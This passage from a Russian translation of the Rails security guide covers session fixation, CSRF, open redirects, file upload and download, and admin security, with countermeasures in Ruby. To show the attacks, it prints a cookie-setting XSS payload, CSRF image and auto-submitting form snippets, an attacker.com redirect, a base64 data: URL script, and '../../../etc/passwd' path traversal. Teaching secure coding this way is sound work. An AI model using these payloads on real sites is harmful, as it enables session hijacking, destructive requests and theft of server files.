+</li></ul><p>Включение поля nonce (случайное значение) в сессию решает проблему атак повторного воспроизведения. Поле nonce валидно только один раз, и сервер должен отслеживать все валидные nonce. Такое становится еще более сложным, если у вас несколько серверов приложений. Хранение nonce в таблице базы данных аннулирует основную цель CookieStore (избежание доступа к базе данных).</p><p>Лучшее <em>решение против атак - это хранить данные такого рода не в сессии, а в базе данных</em>. В нашем случае храните величину кредита в базе данных, а <code>logged_in_user_id</code> в сессии.</p><h4 id='fiksatsii-sessii' class='inside_page_header'><a href="#fiksatsii-sessii">2.6.</a> Фиксации сессии</h4><div class="note"><p><em>Кроме кражи ID сессии пользователя, злоумышленник может исправить ID сессии на известный ему. Это называется фиксацией сессии.</em></p></div><p><img src='/assets/security/session_fixation-95c0733a2eb7525c445d8bd5cee5a3ea8813c8cd16fa00e19ab3908c39e6a9af.png' title='' alt='Фиксация сессии' class='img-polaroid' /></p><p>Эта атака сосредоточена на ID сессии пользователя, известному злоумышленнику, и принуждению браузера пользователя использовать этот ID. После этого злоумышленнику не нужно воровать ID сессии. Вот как эта атака работает:</p><ul><li>Злоумышленник создает валидный ID сессии: он загружает страницу авторизации веб-приложения, где он хочет исправить сессию, и принимает id сессии в куки из отклика (смотрите номера 1 и 2 на изображении).
+</li><li>Он поддерживает сессию, периодически обращаясь к приложению, чтобы сохранить сессию действующей.
+</li><li>Злоумышленник принуждает браузер пользователя использовать этот ID сессии (смотрите номер 3 на изображении). Поскольку нельзя изменить куки другого домена (из-за политики общего происхождения), злоумышленник должен запустить JavaScript из домена целевого веб-приложения. Инъекция кода JavaScript в приложение с помощью XSS завершает эту атаку. Вот пример: <code>&lt;script&gt;document.cookie=&quot;_session_id=16d5b78abb28e3d6206b60f22a03c8d9&quot;;&lt;/script&gt;</code>. Про XSS и инъекции будет написано позже.
+</li><li>Злоумышленник заманивает жертву на зараженную страницу с кодом JavaScript. Просмотрев эту страницу, браузер жертвы изменит ID сессии на ID сессии-ловушки.
+</li><li>Так как новая сессия-ловушка не использовалась, веб-приложение затребует аутентификации пользователя.
+</li><li>С этого момента жертва и злоумышленник будут совместно использовать веб-приложение с одинаковой сессией: сессия станет валидной и жертва не будет уведомлена об атаке.
+</li></ul><h4 id='fiksatsii-sessii-kontrmery' class='inside_page_header'><a href="#fiksatsii-sessii-kontrmery">2.7.</a> Фиксации сессии - контрмеры</h4><div class="info"><p><em>Одна строчка кода защитит вас от фиксации сессии.</em></p></div><p>Наиболее эффективная контрмера - это <em>создавать новый идентификатор сессии</em> и объявлять старый невалидным после успешного входа. Тогда злоумышленник не сможет использовать подмененный идентификатор сессии. Это также хорошая контрмера против угона сессии. Вот как создать новую сессию в Rails:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="n">reset_session</span>
+</code></pre>
+</div>
+<p>Если используете популярный гем <a href="https://rubygems.org/gems/devise">Devise</a> для управления пользователями, он автоматически оканчивает сессии при входе и выходе. Если вы пишете управление пользователями сами, не забудьте окончить сессию после экшна входа (когда создается сессия). Это удалит любые значения из сессии, <em>поэтому необходимо передать их в новую сессию</em>.</p><p>Другой контрмерой является <em>сохранение специфичных для пользователя свойств в сессии</em>, проверка их каждый раз с входящим запросом и запрет доступа, если информация не соответствует. Такими свойствами могут быть удаленный адрес IP или агент пользователя (имя веб-браузера), хотя последний менее специфичен. При сохранении адреса IP вы должны понимать, что имеется большое количество интернет провайдеров или больших организаций, размещающих своих пользователей за прокси. <em>Адрес может меняться в течении сессии</em>, поэтому такие пользователи не смогут использовать ваше приложение, либо только с ограничениями.</p><h4 id='okonchanie-sessii' class='inside_page_header'><a href="#okonchanie-sessii">2.8.</a> Окончание сессии</h4><div class="note"><p><em>Сессии, которые не имеют время жизни, растягивают временной период для атак, таких как межсайтовая подделка запроса (CSRF), угон сессии и фиксация сессии.</em></p></div><p>Один из способов - это установить временную метку окончания куки с ID сессии. Однако клиент может редактировать куки, хранящиеся в веб-браузере, поэтому сессии со сроком действия безопаснее хранить на сервере. Вот пример как <em>окончить сессии в таблице базы данных</em>. Вызовите <code>Session.sweep(20.minutes)</code> чтобы окончить сессии, которые использовались более 20 минут назад.</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="k">class</span> <span class="nc">Session</span> <span class="o">&lt;</span> <span class="no">ApplicationRecord</span>
+  <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">sweep</span><span class="p">(</span><span class="n">time</span> <span class="o">=</span> <span class="mi">1</span><span class="p">.</span><span class="nf">hour</span><span class="p">)</span>
+    <span class="n">where</span><span class="p">(</span><span class="s2">"updated_at &lt; ?"</span><span class="p">,</span> <span class="n">time</span><span class="p">.</span><span class="nf">ago</span><span class="p">.</span><span class="nf">to_fs</span><span class="p">(</span><span class="ss">:db</span><span class="p">)).</span><span class="nf">delete_all</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+</code></pre>
+</div>
+<p>Раздел о фиксации сессии представил проблему поддержки сессий. Злоумышленник, поддерживающий сессию каждые пять минут, будет поддерживать срок жизни сессии вечно, хотя у сессии и есть срок действия. Простым решением для этого может быть добавление столбца <code>created_at</code> в таблицу sessions. Теперь можете удалять сессии, которые были созданы очень давно. Используйте эту строчку в вышеупомянутом методе sweep:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="n">where</span><span class="p">(</span><span class="s2">"updated_at &lt; ? OR created_at &lt; ?"</span><span class="p">,</span> <span class="n">time</span><span class="p">.</span><span class="nf">ago</span><span class="p">.</span><span class="nf">to_fs</span><span class="p">(</span><span class="ss">:db</span><span class="p">),</span> <span class="mi">2</span><span class="p">.</span><span class="nf">days</span><span class="p">.</span><span class="nf">ago</span><span class="p">.</span><span class="nf">to_fs</span><span class="p">(</span><span class="ss">:db</span><span class="p">)).</span><span class="nf">delete_all</span>
+</code></pre>
+</div>
+<h3 id='cross-site-request-forgery-csrf' class='inside_page_header'><a href="#cross-site-request-forgery-csrf">3.</a>  Межсайтовая подделка запроса (CSRF, Cross-Site Request Forgery)</h3><p>Этот метод атаки работает через включение вредоносного кода или ссылки на страницу, которая обращается к веб-приложению, на котором предполагается, что пользователь аутентифицирован. Если сессия для того веб-приложения не истекла, злоумышленник сможет выполнить несанкционированные команды.</p><p><img src='/assets/security/csrf-4a84f41dd2f0432834e10f7227f0fb7086f4f4488568883e94778a8563b00888.png' title='' alt='Межсайтовая подделка запроса' class='img-polaroid' /></p><p>В <a href="#sessions">главе про сессии</a> мы узнали, что большинство приложений на Rails используют сессии, основанные на куки. Либо они хранят ID сессии в куки и имеют хэш сессии на сервере, либо весь хэш сессии на клиенте. В любом случае, браузер автоматически пошлет куки с каждым запросом к домену, если он найдет куки для этого домена. Спорный момент в том, что он также пошлет куки, если запрос идет с сайта другого домена. Давайте рассмотрим пример:</p><ul><li>Bob просматривает доску объявлений и смотрит публикацию от хакера, в которой имеется созданный HTML элемент изображения. Элемент ссылается на команду в приложении Bob-а по управлению проектами, а не на файл изображения: <code>&lt;img src=&quot;http://www.webapp.com/project/1/destroy&quot;&gt;</code>
+</li><li>Сессия Bob-а на <code>www.webapp.com</code> все еще действующая, так как он работал с сайтом несколько минут назад.
+</li><li>Просматривая публикацию, браузер находит тег изображения. Он пытается загрузить предполагаемое изображение с сайта <code>www.webapp.com</code>. Как уже объяснялось, он также посылает куки с валидным ID сессии.
+</li><li>Веб-приложение <code>www.webapp.com</code> подтверждает информацию о пользователе в соответствующей сессии и уничтожает проект с ID 1. Затем он возвращает итоговую страницу, которая не является ожидаемым результатом для браузера, поэтому он не отображает изображение.
+</li><li>Bob не уведомляется об атаке - но несколько дней спустя он обнаруживает, что проекта номер один больше нет.
+</li></ul><p>Важно отметить, что фактически создаваемое изображение или ссылка не обязательно должны быть расположены в домене веб-приложения, они могут быть где угодно – на форуме, в публикации блога или в email.</p><p>CSRF очень редко появляется среди CVE (распространённых уязвимостей и опасностей) - менее 0.1% в 2006 - но на самом деле это &quot;спящий гигант&quot;. Это значительно контрастирует с результатами множества работ по безопасности - <em>CSRF является важным вопросом безопасности</em>.</p><h4 id='csrf-countermeasures' class='inside_page_header'><a href="#csrf-countermeasures">3.1.</a>  Контрмеры CSRF</h4><div class="note"><p><em>Во-первых, как это требуется W3C, используйте надлежащим образом GET и POST. Во-вторых, токен безопасности в не-GET-запросах защитит ваше приложение от CSRF.</em></p></div><p>Протокол HTTP, по существу, представляет два основных типа запросов - GET и POST (DELETE, PUT и PATCH должны использоваться как POST). Консорциум Всемирной паутины (W3C) предоставляет контрольный список для выбора между HTTP методами GET или POST:</p><p><strong>Используйте GET, если:</strong></p><ul><li>Взаимодействие более <em>похоже на вопрос</em> (например, это безопасная операция, такая как запрос, операция чтения или поиска).
+</li></ul><p><strong>Используйте POST, если:</strong></p><ul><li>Взаимодействие более <em>похоже на распоряжение</em>, или
+</li><li>Взаимодействие <em>изменяет состояние</em> ресурса способом, который пользователь будет осознавать (например, подписка на сервис), или
+</li><li>Пользователь <em>несет ответственность за результат</em> взаимодействия.
+</li></ul><p>Если Ваше приложение является RESTful, можете использовать дополнительные методы HTTP, такие как PATCH, PUT или DELETE. Некоторые устаревшие веб-браузеры, однако, не поддерживают их - только GET и POST. Rails использует скрытое поле <code>_method</code> для обработки этих случаев.</p><p><em>Запросы POST также могут быть посланы автоматически</em>. В этом примере, ссылка <code>www.harmless.com</code> показывается как назначение в строке состояния браузера. Но фактически она динамически создает новую форму, посылающую запрос POST.</p><div class="code_container">
+  <pre><code class="highlight html"><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"http://www.harmless.com/"</span> <span class="na">onclick=</span><span class="s">"
+  var f = document.createElement('form');
+  f.style.display = 'none';
+  this.parentNode.appendChild(f);
+  f.method = 'POST';
+  f.action = 'http://www.example.com/account/destroy';
+  f.submit();
+  return false;"</span><span class="nt">&gt;</span>To the harmless survey<span class="nt">&lt;/a&gt;</span>
+</code></pre>
+</div>
+<p>Или злоумышленник поместит код в обработчик события onmouseover изображения:</p><div class="code_container">
+  <pre><code class="highlight html"><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"http://www.harmless.com/img"</span> <span class="na">width=</span><span class="s">"400"</span> <span class="na">height=</span><span class="s">"400"</span> <span class="na">onmouseover=</span><span class="s">"..."</span> <span class="nt">/&gt;</span>
+</code></pre>
+</div>
+<p>Имеется множество других возможностей, наподобие использования тега <code>&lt;script&gt;</code> для осуществления межсайтового запроса к URL с откликом JSONP или JavaScript. Откликом является исполняемый код, для которого злоумышленник может найти способ запуска, возможно с извлечением чувствительных данных. Для защиты от утечки этих данных мы должны запрещать межсайтовые теги <code>&lt;script&gt;</code>. Однако, запросы Ajax подчиняются доменной политике браузера (только вашему сайту разрешено инициировать <code>XmlHttpRequest</code>), поэтому мы можем безопасно разрешить им возвращать отклики JavaScript.</p><div class="note"><p>Мы не можем отличить домен тега <code>&lt;script&gt;</code> - был ли это тег на вашем сайте или на сайте злоумышленника - поэтому мы должны блокировать <code>&lt;script&gt;</code> всегда и везде, даже если это фактически безопасный скрипт, отданный с вашего сайта на вашем домене. В таких случаях, явно отменяйте защиту CSRF на экшнах, обслуживающих JavaScript, в том числе от тега <code>&lt;script&gt;</code>.</p></div><p>Для защиты от остальных подделанных запросов, мы представляем <em>обязательный токен безопасности</em>, который знает ваш сайт, но не знают остальные. Мы включаем токен безопасности в запросы и проверяем его на сервере. Это выполняется автоматически, когда <a href="/configuring#config-action-controller-default-protect-from-forgery"><code>config.action_controller.default_protect_from_forgery</code></a> установлена <code>true</code>, что является значением по умолчанию для новых приложений на Rails. Также это можно сделать вручную, добавив следующее в контроллер приложения:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="n">protect_from_forgery</span> <span class="ss">with: :exception</span>
+</code></pre>
+</div>
+<p>Это включит токен безопасности во все формы и запросы Ajax, генерируемые Rails. Если токен безопасности не будет соответствовать ожидаемому, будет вызвано исключение.</p><div class="note"><p>По умолчанию, Rails включает <a href="https://github.com/rails/rails/blob/main/actionview/app/assets/javascripts">ненавязчивый скриптовый адаптер</a>, который добавляет заголовок, называемый <code>X-CSRF-Token</code> с токеном безопасности, в каждый не-GET Ajax-запрос. Без этого заголовка не-GET Ajax-запросы не будут приняты Rails. При использовании другой библиотеки для Ajax-запросов, необходимо добавить токен безопасности как заголовок по умолчанию в Ajax-запросах в вашей библиотеке. Для получения токена, посмотрите на тег <code>&lt;meta name=&#39;csrf-token&#39; content=&#39;THE-TOKEN&#39;&gt;</code>, получаемый с помощью <code>&lt;%= csrf_meta_tags %&gt;</code> во вью вашего приложения.</p></div><p>Является обычной практикой использование персистентных куки для хранения пользовательской информации, к примеру с помощью <code>cookies.permanent</code>. В этом случае куки не будут очищены и встроенная защита от CSRF не будет эффективна. Если для этой информации вы используете хранилище куки иное, чем сессия, то должны указать, что делать, самостоятельно:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="n">rescue_from</span> <span class="no">ActionController</span><span class="o">::</span><span class="no">InvalidAuthenticityToken</span> <span class="k">do</span> <span class="o">|</span><span class="n">exception</span><span class="o">|</span>
+  <span class="n">sign_out_user</span> <span class="c1"># Метод для примера, уничтожающий куки пользователя</span>
+<span class="k">end</span>
+</code></pre>
+</div>
+<p>Вышеуказанный метод должен быть помещен в <code>ApplicationController</code> и вызываться, когда отсутствует или неправильный токен CSRF для не-GET-запроса.</p><p>Отметьте, что <em>уязвимости межсайтового скриптинга (XSS) обходят все защиты от CSRF</em>. XSS дает злоумышленнику доступ ко всем элементам на странице, поэтому он может прочитать токен безопасности CSRF из формы или непосредственно подтвердить форму. Читайте <a href="#cross-site-scripting-xss">более подробно о XSS</a> позже.</p><h3 id='perenapravlenie-i-fayly' class='inside_page_header'><a href="#perenapravlenie-i-fayly">4.</a> Перенаправление и файлы</h3><p>Другой класс уязвимостей в безопасности связан с использованием перенаправления и файлов в веб-приложениях.</p><h4 id='perenapravlenie' class='inside_page_header'><a href="#perenapravlenie">4.1.</a> Перенаправление</h4><div class="warning"><p><em>Перенаправление в веб-приложении - это недооцененный инструмент взломщика: на сайт-ловушку может направить пользователя не только злоумышленник, но и сам пользователь.</em></p></div><p>Всякий раз когда пользователь допускается к передаче (всего или части) URL для перенаправления, это является возможной уязвимостью. Наиболее банальной атакой может быть перенаправление пользователей на фальшивое веб-приложение, которое выглядит и работает как настоящее. Эта так называемая фишинговая атака работает через посланную не вызывающую подозрения ссылку в email для пользователей, вставленную в приложение ссылку с помощью XSS или ссылку, помещенную на внешнем сайте. Она не вызывает подозрений, так как ссылка начинается с URL к веб-приложению, а URL к злонамеренному сайту скрыт в параметре перенаправления: <a href="http://www.example.com/site/redirect?to=www.attacker.com">http://www.example.com/site/redirect?to=www.attacker.com</a>. Вот пример экшна legacy:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="k">def</span> <span class="nf">legacy</span>
+  <span class="n">redirect_to</span><span class="p">(</span><span class="n">params</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">action</span><span class="ss">:'main'</span><span class="p">))</span>
+<span class="k">end</span>
+</code></pre>
+</div>
+<p>Он перенаправит пользователя на экшн main, если тот попытается получить доступ к экшну legacy. Намерением было сохранить параметры URL к экшну legacy и передать их экшну main. Однако это может быть использовано злоумышленником, если он включит ключ host в URL:</p><div class="code_container">
+  <pre><code class="highlight plaintext">http://www.example.com/site/legacy?param1=xy&amp;param2=23&amp;host=www.attacker.com
+</code></pre>
+</div>
+<p>Этот URL в конце вряд ли будет замечен и перенаправит пользователя на хост <code>attacker.com</code>. Как правило, передача пользовательских данных непосредственно в <code>redirect_to</code> рассматривается опасной. Простой контрмерой будет являться <em>включение только ожидаемых параметров в экшн legacy</em> (снова подход списка разрешений, в отличие от устранения нежелательных параметров). <em>И если вы перенаправляете на URL, сверьтесь со списком разрешений или регулярным выражением</em>.</p><h5 id='samodostatochnyy-xss' class='inside_page_header'><a href="#samodostatochnyy-xss">4.1.1.</a> Самодостаточный XSS</h5><p>Другая перенаправляющая и самодостаточная XSS атака работает в Firefox и Opera с использованием протокола данных. Этот протокол отображает свое содержимое прямо в браузер и может быть чем угодно от HTML или JavaScript до простых изображений:</p><p><code>data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K</code></p><p>Этот пример является закодированным Base64 JavaScript, который отображает простое окно сообщения. В перенаправляющем URL злоумышленник может перенаправить на этот URL с помощью злонамеренного кода в нем. В качестве контрмеры <em>не позволяйте пользователю предоставлять (полностью или частично) URL, на который нужно перенаправить</em>.</p><h4 id='zagruzki-fayla' class='inside_page_header'><a href="#zagruzki-fayla">4.2.</a> Загрузки файла</h4><div class="note"><p><em>Убедитесь, что загрузки файлов не перезапишут важные файлы и обрабатывают медиафайлы асинхронно.</em></p></div><p>Многие веб-приложения позволяют пользователям загружать файлы. <em>Имена файла, которые пользователи могут выбирать (частично), всегда должны фильтроваться</em>, так как злоумышленник может использовать злонамеренное имя файла для перезаписи любого файла на сервере. Если загруженные файлы хранятся в /var/www/uploads, и пользователь введет имя файла такое как &quot;../../../etc/passwd&quot;, это сможет перезаписать важный файл. Конечно, интерпретатору Ruby будут требоваться необходимые права доступа, чтобы сделать это – еще одна причина запускать веб-серверы, серверы базы данных и другие программы под наименее привилегированным пользователем Unix.</p><p>Когда фильтруете имена файлов, введенных пользователем, <em>не пытайтесь убрать злонамеренные части</em>. Подумайте о ситуации, когда веб-приложение убирает все &quot;../&quot; в имени файла, и злоумышленник использует строку, такую как “....//”, результатом будет &quot;../&quot;. Лучше использовать подход разрешенного списка, который <em>проверяет на валидность имя файла с помощью набора приемлемых символов</em>. Это противопоставляется подходу списка ограничений, который пытается убрать недопустимые символы. В случае невалидного имени файла отвергните его (или замените неприемлемые символы), но не убирайте их. Вот санитайзер имени файла из <a href="http://github.com/technoweenie/attachment_fu/tree/master">плагина attachment_fu</a>:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="k">def</span> <span class="nf">sanitize_filename</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+  <span class="n">filename</span><span class="p">.</span><span class="nf">strip</span><span class="p">.</span><span class="nf">tap</span> <span class="k">do</span> <span class="o">|</span><span class="nb">name</span><span class="o">|</span>
+    <span class="c1"># NOTE: File.basename doesn't work right with Windows paths on Unix</span>
+    <span class="c1"># get only the filename, not the whole path</span>
+    <span class="nb">name</span><span class="p">.</span><span class="nf">sub!</span> <span class="sr">/\A.*(\\|\/)/</span><span class="p">,</span> <span class="s1">''</span>
+    <span class="c1"># Finally, replace all non alphanumeric, underscore</span>
+    <span class="c1"># or periods with underscore</span>
+    <span class="nb">name</span><span class="p">.</span><span class="nf">gsub!</span> <span class="sr">/[^\w\.\-]/</span><span class="p">,</span> <span class="s1">'_'</span>
+  <span class="k">end</span>
+<span class="k">end</span>
+</code></pre>
+</div>
+<p>Значительный недостаток синхронной обработки загрузок файла (что плагин <code>attachment_fu</code> может сделать с изображениями), это его <em>уязвимость к DoS-атакам</em>. Злоумышленник может синхронно начать загрузки файла изображения с многих компьютеров, которые увеличат загрузку сервера и могут в конечном счете свалить или затормозить сервер.</p><p>Лучшее решение этого состоит в <em>асинхронной обработке медиафайлов</em>: сохраните медиафайл и расписание обработки запроса в базу данных. Второй процесс будет заниматься обработкой файла в фоновом режиме.</p><h4 id='ispolnyaemyy-kod-v-zagruzkah-fayla' class='inside_page_header'><a href="#ispolnyaemyy-kod-v-zagruzkah-fayla">4.3.</a> Исполняемый код в загрузках файла</h4><div class="warning"><p><em>Исходный код в загруженных файлах может быть выполнен при помещении в определенные директории. Не помещайте загрузки файла в директорию /public приложения Rails, если это домашняя директория Apache.</em></p></div><p>Популярный веб-сервер Apache имеет опцию, называемую DocumentRoot. Это домашняя директория веб-сайта, все в дереве этой директории будет обслуживаться веб-сервером. Если там имеются файлы с определенным расширением имени, код в в них будет выполнен при запросе (может требоваться установка некоторых опций). Примерами этого являются файлы PHP и CGI. Теперь представьте ситуацию, когда злоумышленник загружает файл “file.cgi” с кодом, который будет выполнен, когда кто-то скачивает файл.</p><p><em>Если Apache DocumentRoot указывает на директорию /public приложения Rails, не помещайте загрузки файла в него</em>, храните файлы как минимум на один уровень выше.</p><h4 id='skachivaniya-fayla' class='inside_page_header'><a href="#skachivaniya-fayla">4.4.</a> Скачивания файла</h4><div class="note"><p><em>Убедитесь, что пользователи не могут скачивать произвольные файлы.</em></p></div><p>Так же как вы фильтруете имена файла для загрузки, следует делать то же самое для скачивания. Метод <code>send_file()</code> посылает файлы от сервера на клиент. Если использовать имя файла, введенного пользователем, без фильтрации, может быть скачан любой файл:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="n">send_file</span><span class="p">(</span><span class="s1">'/var/www/uploads/'</span> <span class="o">+</span> <span class="n">params</span><span class="p">[</span><span class="ss">:filename</span><span class="p">])</span>
+</code></pre>
+</div>
+<p>Просто передайте имя файла такое, как &quot;../../../etc/passwd&quot;, чтобы загрузить информацию о доступе к серверу. Простым решением против этого является <em>проверка того, что запрашиваемый файл находится в ожидаемой директории</em>:</p><div class="code_container">
+  <pre><code class="highlight ruby"><span class="n">basename</span> <span class="o">=</span> <span class="no">File</span><span class="p">.</span><span class="nf">expand_path</span><span class="p">(</span><span class="s1">'../../files'</span><span class="p">,</span> <span class="n">__dir__</span><span class="p">)</span>
+<span class="n">filename</span> <span class="o">=</span> <span class="no">File</span><span class="p">.</span><span class="nf">expand_path</span><span class="p">(</span><span class="no">File</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">basename</span><span class="p">,</span> <span class="vi">@file</span><span class="p">.</span><span class="nf">public_filename</span><span class="p">))</span>
+<span class="k">raise</span> <span class="k">if</span> <span class="n">basename</span> <span class="o">!=</span>
+     <span class="no">File</span><span class="p">.</span><span class="nf">expand_path</span><span class="p">(</span><span class="no">File</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="no">File</span><span class="p">.</span><span class="nf">dirname</span><span class="p">(</span><span class="n">filename</span><span class="p">),</span> <span class="s1">'../../../'</span><span class="p">))</span>
+<span class="n">send_file</span> <span class="n">filename</span><span class="p">,</span> <span class="ss">disposition: </span><span class="s1">'inline'</span>
+</code></pre>
+</div>
+<p>Другой (дополнительный) подход заключается в хранении имен файлов в базе данных и именовании файлов на диске по id в базе данных. Это также хороший подход для избежания возможного кода в загруженных файлах, который может быть выполнен. Плагин <code>attachment_fu</code> осуществляет это похожим образом.</p><h3 id='intranet-i-bezopasnost-administratora' class='inside_page_header'><a href="#intranet-i-bezopasnost-administratora">5.</a> Интранет и безопасность администратора</h3><p>Интранет и административные интерфейсы являются популярной целью для атак, поскольку они предоставляют привилегированный доступ. Хотя это и может потребовать несколько дополнительных мер безопасности, таковы реалии современного мира.</p><p>В 2007 году зарегистрирован первый специально изготовленный троян, похищающий информацию из Интранета, названный &quot;Monster for employers&quot; по имени веб-сайта Monster.com, онлайн приложения по найму работников. Специально изготовленные трояны очень редки, поэтому риск достаточно низок, но, конечно, возможен, и пример показывает, что безопасность хоста клиента тоже важна. Однако, наибольшей угрозой для Интранета и администраторских приложений являются XSS и CSRF.</p><p><strong>XSS</strong>: Если ваше приложение повторно отображает введенные пользователем вредоносные данные, приложение уязвимо к XSS. Имена пользователей, комментарии, отчеты о спаме, адреса заказов - это всего лишь обычные примеры, где может быть XSS.</p><p>Если есть всего лишь одно место в админке или Интранете, где ввод не был обработан, это делает целое приложение уязвимым. Возможными результатами могут быть похищение привилегированных администраторских куки, встраивание iframe для похищения администраторского пароля или установка злонамеренного программного обеспечения через дыры в безопасности браузера для установления контроля над компьютером администратора.</p><p>Обратитесь к разделу про инъекции для контрмер против XSS.</p><p><strong>CSRF</strong>: Межсайтовая подделка запроса (CSRF), также известная как межсайтовая подделка ссылок (XSRF), - это гигантский метод атаки, он позволяет злоумышленнику делать все то, что может делать администратор или пользователь Интранета. Так как мы уже раньше рассматривали как работает CSRF, вот несколько примеров того, как злоумышленники могут обращаться с Интранетом или административным интерфейсом.</p><p>Реальным примером является <a href="http://www.h-online.com/security/news/item/Symantec-reports-first-active-attack-on-a-DSL-router-735883.html">перенастройка роутера с помощью CSRF</a>. Злоумышленники разослали зловредные электронные письма с вложенным CSRF мексиканским пользователям. Письма утверждали, что пользователя ждет пластиковая карточка, но они также содержали тег изображения, который приводил к запросу HTTP-GET на перенастройку роутера пользователя (наиболее популярной модели в Мексике). Запрос изменял настройки DNS таким образом, что запросы к мексиканскому банковскому сайту направлялись на сайт злоумышленников. Все, кто обращался к банковскому сайту через роутер, видели фальшивый сайт злоумышленников, и у них были похищены учетные данные.</p><p>Другой пример изменял адрес почты и пароль Google Adsense. Если жертва входила в Google Adsense, административный интерфейс рекламных компаний Google, злоумышленник изменял ее учетные данные.</p><p>Другой популярной атакой является спам от вашего веб-приложения, вашего блога или форума для распространения зловредного XSS. Конечно, злоумышленник должен знать структуру URL, но большинство URL Rails достаточно просты или они могут быть легко найдены, если это административный интерфейс приложения с открытым кодом. Злоумышленник даже может сделать 1,000 попыток, просто включив злонамеренный тег IMG, который пытается использовать каждую возможную комбинацию.</p><p>По <em>контрмерам против CSRF в административных интерфейсах и приложениях Интранет, обратитесь к разделу по CSRF</em>.</p><h4 id='dopolnitelnye-mery-predostorozhnosti' class='inside_page_header'><a href="#dopolnitelnye-mery-predostorozhnosti">5.1.</a> Дополнительные меры предосторожности</h4><p>Обычный административный интерфейс работает подобно следующему: расположен в <a href="http://www.example.com/admin">www.example.com/admin</a>, может быть доступным, только если настроен признак администратора в модели User, отображает данные, введенные пользователем, и позволяет админу удалять/добавлять/редактировать любую желаемую информацию. Вот некоторые мысли обо всем этом:</p><ul><li><p>Очень важно <em>думать о худшем случае</em>: что если кто-то в самом деле достанет ваши куки или пользовательские учетные данные? Вы должны <em>ввести роли</em> для административного интерфейса, чтобы ограничить возможности злоумышленника. Или как насчет <em>специальных учетных данных авторизации</em> для административного интерфейса, отличающихся от тех, которые используются в публичной части приложения? Или <em>специального пароля для очень серьезных действий</em>?</p></li><li><p>Действительно ли админ должен иметь доступ к интерфейсу из любой точки мира? Подумайте насчет <em>ограничения авторизации списком IP-адресов</em>. Проверьте request.remote_ip для того, чтобы узнать об IP-адресах пользователя. Это не абсолютная, но серьезная защита. Хотя помните, что могут использоваться прокси.</p></li><li><p><em>Поместите административный интерфейс в специальный поддомен</em>, такой как admin.application.com, и сделайте его отдельным приложением со своим собственным управлением пользователями. Это сделает похищение куки админа из обычного домена <a href="http://www.application.com">www.application.com</a> невозможным. Это происходит благодаря правилу ограничения домена вашего браузера: встроенный (XSS) скрипт на <a href="http://www.application.com">www.application.com</a> не сможет прочитать куки для admin.application.com и наоборот.</p></li></ul><h3 id='user-management' class='inside_page_header'><a href="#user-management">6.</a>  Управление пользователями</h3><div class="note"><p><em>Почти каждое веб-приложение работает с авторизацией и аутентификацией. Вместо написания собственных, целесообразно использование внешних плагинов. Но их нужно также обновлять. Несколько дополнительных мер предосторожности сделают ваше приложение более безопасным.</em></p></div><p>Для Rails имеется ряд плагинов для аутентификации. Хорошие, такие как популярные <a href="https://github.com/heartcombo/devise">devise</a> и <a href="https://github.com/binarylogic/authlogic">authlogic</a>, сохраняют только криптографически хэшированные пароли, а не чистый текст. Начиная с Rails 3.1 можно использовать встроенный метод <a href="https://api.rubyonrails.org/classes/ActiveModel/SecurePassword/ClassMethods.html#method-i-has_secure_password"><code>has_secure_password</code></a>, поддерживающий механизмы шифрования пароля, подтверждения и восстановления.</p><h4 id='brutfors-akkauntov' class='inside_page_header'><a href="#brutfors-akkauntov">6.1.</a> Брутфорс аккаунтов</h4><div class="note"><p><em>Брутфорс-атаки на аккаунты - это атаки методом проб и ошибок на учетные данные для входа. Отбиться от них можно с помощью обычных сообщений об ошибке и, возможно, требования ввести CAPTCHA.</em></p></div><p>Перечень имен пользователей вашего веб-приложения может быть использован для брутфорса соответствующих паролей, поскольку большинство людей не используют сложные пароли. Большинство паролей - это комбинация слов из словаря и, возможно, цифр. Таким образом, вооруженная перечнем пользователей и словарем, автоматическая программа может подобрать правильный пароль за считанные минуты.</p><p>Поэтому большинство приложений отображают общее сообщение об ошибке &quot;неправильное имя пользователя или пароль&quot;, если даже одно из них неправильное. Если оно сообщит &quot;имя пользователя, которое вы ввели, не найдено&quot;, злоумышленник сможет автоматически собрать перечень имен пользователя.</p><p>Однако часто разработчики веб-приложения пренебрегают страницами восстановления пароля. Эти страницы часто признают, что введенное имя пользователя или адрес e-mail (не) был найден. Это позволяет злоумышленнику собирать перечень имен пользователей и брутфорсить аккаунты.</p><p>В целях смягчения таких атак, <em>отображайте общее сообщение об ошибке и на страницах восстановления пароля</em>. Более того, можете <em>требовать ввести CAPTCHA после нескольких проваленных попыток входа с одного адреса IP</em>. Отметим, что это не пуленепробиваемая защита против автоматических программ, поскольку эти программы могут изменять свой адрес IP так часто, как нужно. Однако это будет барьером для атаки.</p><h4 id='ugon-akkaunta' class='inside_page_header'><a href="#ugon-akkaunta">6.2.</a> Угон аккаунта</h4><p>Многие веб-приложения позволяют легко угнать пользовательские аккаунты. Почему бы не отличиться и не сделать это более трудным?</p><h5 id='paroli' class='inside_page_header'><a href="#paroli">6.2.1.</a> Пароли</h5><p>Подумайте о ситуации, когда злоумышленник украл куки сессии пользователя и, таким образом, может совместно с ним использовать приложение. Если будет просто сменить пароль, злоумышленник угонит аккаунт в два клика. Или, если форма изменения пароля уязвима для CSRF, злоумышленник сможет изменить пароль жертвы, заманив его на веб-страницу, на которой содержится тег IMG, осуществляющий CSRF. Как контрмера - <em>делайте формы изменения пароля безопасными против CSRF</em>, естественно. И <em>требуйте от пользователя ввести старый пароль при его изменении</em>.</p><h5 id='e-mail' class='inside_page_header'><a href="#e-mail">6.2.2.</a> E-Mail</h5><p>Однако 